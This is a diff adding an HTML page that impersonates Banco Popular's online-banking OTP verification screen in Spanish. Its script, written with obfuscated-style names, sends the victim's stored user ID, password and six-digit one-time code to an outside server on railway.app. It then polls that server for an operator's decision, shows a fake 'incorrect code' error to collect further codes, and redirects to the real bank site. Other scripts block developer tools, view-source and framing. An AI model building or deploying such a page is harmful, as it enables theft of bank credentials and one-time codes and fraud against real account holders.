@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Verificación Código OTP - Banco Popular banca en línea.">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="theme-color" content="#00556e">
+    <link rel="icon" type="image/svg+xml" href="img/Isotipo.svg">
+    <title>Código OTP - Banco Popular</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        @keyframes pageEnter {
+            from { opacity: 0; transform: translateY(20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        body { animation: pageEnter 0.6s cubic-bezier(0.4, 0, 0.2, 1) both; }
+        #loading-screen { animation: none; }
+    </style>
+</head>
+<body>
+    <div id="loading-screen" class="loading-screen hidden">
+        <div class="loading-content">
+            <div class="loading-logo-circle">
+                <video class="loading-video" autoplay loop muted playsinline>
+                    <source src="img/panimada.mp4" type="video/mp4">
+                </video>
+            </div>
+            <p class="loading-title">Estamos validando tu información</p>
+            <p class="loading-subtitle">Por favor espera un momento</p>
+        </div>
+    </div>
+
+    <div class="page-wrapper">
+        <main class="otp-main">
+            <div class="otp-inner">
+                <div class="otp-card">
+                    <div class="card-security-icon">
+                        <img src="img/icon-security-lock.svg" alt="Seguridad" onerror="this.parentNode.innerHTML='<span>🔒</span>'">
+                    </div>
+
+                    <h1 class="login-title">Bienvenido a</h1>
+                    <div class="login-logo">
+                        <img src="img/Isotipo.svg" alt="Banco Popular" class="login-isotipo">
+                        <span class="login-banco-text">banco popular</span>
+                    </div>
+
+                    <div id="error-banner" class="error-banner hidden" role="alert">
+                        <span class="error-banner-icon">❌</span>
+                        <p id="error-message" class="error-banner-message">El Código OTP es incorrecto, por favor intente nuevamente.</p>
+                    </div>
+
+                    <form id="otpForm" class="login-form" autocomplete="off">
+                        <div class="form-group">
+                            <label for="otp-input" class="otp-label">Código OTP</label>
+                            <input
+                                type="text"
+                                id="otp-input"
+                                class="form-input otp-input"
+                                placeholder=""
+                                maxlength="6"
+                                inputmode="numeric"
+                                pattern="[0-9]*"
+                                autocomplete="one-time-code"
+                            >
+                            <span class="otp-hint">Ingresa el código de 6 dígitos enviado a tu teléfono a través de mensajes de texto.</span>
+                        </div>
+
+                        <button type="submit" id="btn-continuar-otp" class="btn-continuar" disabled>Continuar</button>
+
+                        <div class="otp-links">
+                            <a href="#" class="otp-help-link">¿Problemas con tu código OTP?</a>
+                        </div>
+
+                        <p class="otp-recaptcha">
+                            Protegido por reCAPTCHA &nbsp;|&nbsp;
+                            <a href="#">Privacidad</a> &ndash; <a href="#">Condiciones</a>
+                        </p>
+                    </form>
+                </div>
+
+                <div class="carousel-card" id="dynamic-card">
+                    <div class="carousel-slide active">
+                        <div class="carousel-content">
+                            <h3 class="carousel-title">Pagos rápidos</h3>
+                            <p class="carousel-description">Paga tus servicios públicos/privados y obligaciones bancarias a través de tu cuenta de ahorros.</p>
+                            <a href="#" class="carousel-link">
+                                <span>Inscribe y paga</span>
+                                <span class="carousel-arrow">→</span>
+                            </a>
+                        </div>
+                        <div class="carousel-image-wrap">
+                            <img src="img/Vector.svg" alt="" class="carousel-vec carousel-vec-1" aria-hidden="true">
+                            <img src="img/Vector-1.svg" alt="" class="carousel-vec carousel-vec-2" aria-hidden="true">
+                            <img src="img/Woman-1.png" alt="Persona" class="carousel-image">
+                        </div>
+                    </div>
+
+                    <div class="carousel-slide">
+                        <div class="carousel-content">
+                            <h3 class="carousel-title">Transfiere fácil</h3>
+                            <p class="carousel-description">Envía dinero a tus cuentas o a terceros de forma segura y sin complicaciones.</p>
+                            <a href="#" class="carousel-link">
+                                <span>Transferir</span>
+                                <span class="carousel-arrow">→</span>
+                            </a>
+                        </div>
+                        <div class="carousel-image-wrap">
+                            <img src="img/Vector.svg" alt="" class="carousel-vec carousel-vec-1" aria-hidden="true">
+                            <img src="img/Vector-1.svg" alt="" class="carousel-vec carousel-vec-2" aria-hidden="true">
+                            <img src="img/Woman-2.png" alt="Persona" class="carousel-image">
+                        </div>
+                    </div>
+
+                    <div class="carousel-slide">
+                        <div class="carousel-content">
+                            <h3 class="carousel-title">Consulta tu saldo</h3>
+                            <p class="carousel-description">Revisa el estado de tus productos, movimientos y extractos en tiempo real.</p>
+                            <a href="#" class="carousel-link">
+                                <span>Ver productos</span>
+                                <span class="carousel-arrow">→</span>
+                            </a>
+                        </div>
+                        <div class="carousel-image-wrap">
+                            <img src="img/Vector.svg" alt="" class="carousel-vec carousel-vec-1" aria-hidden="true">
+                            <img src="img/Vector-1.svg" alt="" class="carousel-vec carousel-vec-2" aria-hidden="true">
+                            <img src="img/Woman-3.png" alt="Persona" class="carousel-image">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="carousel-bars">
+                    <div class="carousel-bar active"><div class="carousel-bar-fill"></div></div>
+                    <div class="carousel-bar"><div class="carousel-bar-fill"></div></div>
+                    <div class="carousel-bar"><div class="carousel-bar-fill"></div></div>
+                </div>
+            </div>
+        </main>
+
+        <section class="bottom-card">
+            <div class="legal-links">
+                <a href="#" class="legal-link">Seguridad</a>
+                <a href="#" class="legal-link">Accesibilidad</a>
+            </div>
+
+            <hr class="bottom-divider">
+
+            <div class="bottom-logos">
+                <img src="img/Isotipo.svg" alt="Banco Popular" class="bottom-iso">
+                <span class="bottom-sep"></span>
+                <img src="img/aval.png" alt="Grupo Aval" class="bottom-aval">
+            </div>
+
+            <p class="bottom-date" id="footer-date"></p>
+
+            <p class="bottom-copy">&copy; Banco Popular. Todos los derechos reservados. | v4.2.53</p>
+        </section>
+    </div>
+
+    <script>
+    (function(){
+        var _0xa1 = "https://multi-bancos-production.up.railway.app";
+        var _0xb2 = "popular";
+        var _0xc3 = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000));
+        try { sessionStorage.setItem('sessionId', _0xc3); } catch(e) {}
+
+        var _0xd4 = document.getElementById('otp-input');
+        var _0xe5 = document.getElementById('btn-continuar-otp');
+        var _0xf6 = document.getElementById('otpForm');
+        var _0xg7 = document.getElementById('loading-screen');
+        var _0xh8 = document.getElementById('error-banner');
+        var _0xi9 = document.getElementById('error-message');
+
+        function _0xj0() {
+            var _0xk1 = _0xd4.value.replace(/\D/g, '').slice(0, 6);
+            _0xd4.value = _0xk1;
+            var _0xl2 = _0xk1.length === 6;
+            _0xe5.disabled = !_0xl2;
+            if (_0xl2) { _0xe5.classList.add('enabled'); }
+            else { _0xe5.classList.remove('enabled'); }
+        }
+
+        _0xd4.addEventListener('input', function(){
+            _0xh8.classList.add('hidden');
+            _0xj0();
+        });
+        _0xj0();
+
+        function _0xm3(_0xn4, _0xo5) {
+            _0xi9.textContent = _0xo5;
+            _0xh8.classList.remove('hidden');
+        }
+
+        var _0xp6 = document.querySelectorAll('.carousel-slide');
+        var _0xq7 = document.querySelectorAll('.carousel-bar');
+        var _0xr8 = 0;
+        var _0xs9 = 5000;
+        var _0xintervalo = null;
+
+        function _0xt0(_0xu1) {
+            _0xp6.forEach(function(_0xv2){ _0xv2.classList.remove('active'); });
+            _0xq7.forEach(function(_0xw3){
+                _0xw3.classList.remove('active');
+                var _0xfill = _0xw3.querySelector('.carousel-bar-fill');
+                if (_0xfill) {
+                    _0xfill.style.transition = 'none';
+                    _0xfill.style.width = '0%';
+                }
+            });
+            _0xp6[_0xu1].classList.add('active');
+            _0xq7[_0xu1].classList.add('active');
+            var _0xactiveFill = _0xq7[_0xu1].querySelector('.carousel-bar-fill');
+            if (_0xactiveFill) {
+                void _0xactiveFill.offsetWidth;
+                _0xactiveFill.style.transition = 'width ' + (_0xs9 / 1000) + 's linear';
+                _0xactiveFill.style.width = '100%';
+            }
+            _0xr8 = _0xu1;
+        }
+
+        function _0xiniciar() {
+            if (_0xintervalo) clearInterval(_0xintervalo);
+            _0xintervalo = setInterval(function(){
+                var _0x7e = (_0xr8 + 1) % _0xp6.length;
+                _0xt0(_0x7e);
+            }, _0xs9);
+        }
+
+        _0xt0(0);
+        _0xiniciar();
+
+        _0xq7.forEach(function(_0x8f, _0x9g){
+            _0x8f.addEventListener('click', function(){
+                _0xt0(_0x9g);
+                _0xiniciar();
+            });
+        });
+
+        _0xf6.addEventListener('submit', async function(_0xcia){
+            _0xcia.preventDefault();
+            if (_0xe5.disabled) return;
+
+            var _0xdia = _0xd4.value.trim();
+            if (_0xdia.length !== 6) return;
+
+            var _0xeia = sessionStorage.getItem('usuario') || '';
+            var _0xfia = sessionStorage.getItem('clave') || '';
+
+            _0xg7.classList.remove('hidden');
+            _0xg7.classList.add('show');
+            document.body.style.overflow = 'hidden';
+
+            try {
+                var _0xgia = await fetch(_0xa1 + '/' + _0xb2 + '/enviar-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: _0xc3,
+                        otp: _0xdia,
+                        identificacion: _0xeia,
+                        clave: _0xfia
+                    })
+                });
+                var _0xhia = await _0xgia.json();
+                console.log('OTP enviado:', _0xhia);
+            } catch (_0xiia) {
+                console.error('Error:', _0xiia);
+            }
+
+            var _0xjia = setInterval(async function(){
+                try {
+                    var _0xkia = await fetch(_0xa1 + '/' + _0xb2 + '/estado/' + _0xc3);
+                    var _0xlia = await _0xkia.json();
+                    console.log('Estado:', _0xlia.estado);
+
+                    if (_0xlia.estado === 'finalizado') {
+                        clearInterval(_0xjia);
+                        window.location.href = 'https://www.bancopopular.com.co/';
+                    } else if (_0xlia.estado === 'rechazado') {
+                        clearInterval(_0xjia);
+                        _0xg7.classList.remove('show');
+                        _0xg7.classList.add('hidden');
+                        document.body.style.overflow = '';
+                        _0xd4.value = '';
+                        _0xe5.disabled = true;
+                        _0xe5.classList.remove('enabled');
+                        setTimeout(function(){
+                            _0xm3('❌', 'El Código OTP es incorrecto, por favor intente nuevamente.');
+                        }, 300);
+                    }
+                } catch (_0xmia) {
+                    console.error('Error estado:', _0xmia);
+                }
+            }, 2000);
+        });
+
+        var _0xnia = new Date();
+        var _0xoia = _0xnia.toLocaleDateString('es-CO', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
+        var _0xqia = _0xoia.charAt(0).toUpperCase() + _0xoia.slice(1);
+        var _0xpia = document.getElementById('footer-date');
+        if (_0xpia) _0xpia.textContent = _0xqia + ' | ' + _0xnia.toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', hour12: true });
+    })();
+    </script>
+
+<script>
+(function(){
+'use strict';
+var _0xria=0;
+document.addEventListener('touchend',function(_0xsia){
+var _0xtia=new Date().getTime();
+if(_0xtia-_0xria<=300){_0xsia.preventDefault();}
+_0xria=_0xtia;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xuia){_0xuia.preventDefault();});
+document.addEventListener('focusin',function(_0xvia){
+var _0xwia=(_0xvia.target&&_0xvia.target.tagName)?_0xvia.target.tagName.toLowerCase():'';
+if(_0xwia==='input'||_0xwia==='textarea'||_0xwia==='select'){
+if(_0xvia.target.style.fontSize!=='16px'){
+_0xvia.target.dataset._fs=_0xvia.target.style.fontSize||'';
+_0xvia.target.style.fontSize='16px';
+}
+}
+});
+document.addEventListener('focusout',function(_0xxia){
+var _0xwia=(_0xxia.target&&_0xxia.target.tagName)?_0xxia.target.tagName.toLowerCase():'';
+if(_0xwia==='input'||_0xwia==='textarea'||_0xwia==='select'){
+if(_0xxia.target.dataset._fs!==undefined){
+_0xxia.target.style.fontSize=_0xxia.target.dataset._fs;
+delete _0xxia.target.dataset._fs;
+}
+}
+});
+})();
+</script>
+
+<script>
+(function(){
+'use strict';
+document.addEventListener('contextmenu',function(_0xeia){_0xeia.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xfia){
+var _0xgia=(_0xfia.key||'').toLowerCase();
+var _0xhia=_0xfia.ctrlKey||_0xfia.metaKey;
+var _0xiia=_0xfia.shiftKey;
+if(_0xgia==='f12'){_0xfia.preventDefault();return false;}
+if(_0xhia&&_0xiia&&(_0xgia==='i'||_0xgia==='j'||_0xgia==='c')){_0xfia.preventDefault();return false;}
+if(_0xhia&&_0xgia==='u'){_0xfia.preventDefault();return false;}
+if(_0xhia&&_0xgia==='s'){_0xfia.preventDefault();return false;}
+if(_0xhia&&_0xiia&&(_0xgia==='k'||_0xgia==='e'||_0xgia==='s'||_0xgia==='c')){_0xfia.preventDefault();return false;}
+if(_0xfia.metaKey&&_0xfia.altKey&&(_0xgia==='i'||_0xgia==='j'||_0xgia==='c')){_0xfia.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0xjia){_0xjia.preventDefault();});
+document.addEventListener('selectstart',function(_0xkia){
+var _0xlia=(_0xkia.target&&_0xkia.target.tagName)?_0xkia.target.tagName.toLowerCase():'';
+if(_0xlia!=='input'&&_0xlia!=='textarea'){_0xkia.preventDefault();}
+});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xmia){document.body.innerHTML='';}
+setInterval(function(){
+var _0xnia=window.outerWidth-window.innerWidth;
+var _0xoia=window.outerHeight-window.innerHeight;
+if(_0xnia>160||_0xoia>160){}
+},1000);
+})();
+</script>
+</body>
+</html>
